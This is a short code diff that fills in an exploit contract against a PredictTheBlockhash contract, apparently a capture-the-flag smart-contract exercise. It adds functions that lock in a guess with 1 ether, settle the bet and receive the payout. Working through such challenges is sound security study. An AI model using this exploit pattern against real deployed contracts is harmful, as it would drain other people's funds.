@@ -52,5 +52,15 @@ contract ExploitContract {
         predictTheBlockhash = _predictTheBlockhash;
     }
 
-    // write your exploit code below
+    function lockInGuess() external payable {
+        predictTheBlockhash.lockInGuess{value: 1 ether}("");
+    }
+
+    function settle() external {
+        predictTheBlockhash.settle();
+    }
+
+    receive () external payable {
+
+    }
 }
